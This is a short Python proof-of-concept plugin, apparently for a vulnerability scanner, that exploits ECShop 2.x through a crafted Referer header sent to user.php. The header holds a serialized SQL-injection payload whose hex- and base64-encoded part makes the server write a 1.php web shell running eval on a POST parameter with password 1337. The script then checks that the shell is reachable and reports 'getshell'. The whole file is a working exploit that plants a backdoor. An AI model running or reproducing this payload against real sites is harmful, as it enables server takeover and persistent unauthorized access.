#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'w8ay'
# refer:http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/


def assign(service, arg):
    if service == "ecshop":
        return True, arg


def audit(arg):
    payload = arg + "/user.php?act=login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Referer": '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}'''
    }
    code, head, html, redirect_url, log = hackhttp.http(payload,headers = headers)
    code, head, html, redirect_url, log = hackhttp.http(arg + "/1.php")
    if code == 200:
        msg = "getshell:%s password:1337" % (arg + "/1.php")
        security_hole(msg)


if __name__ == '__main__':
    from dummy import *
    audit(assign('ecshop', 'http://www.example.com/')[1])
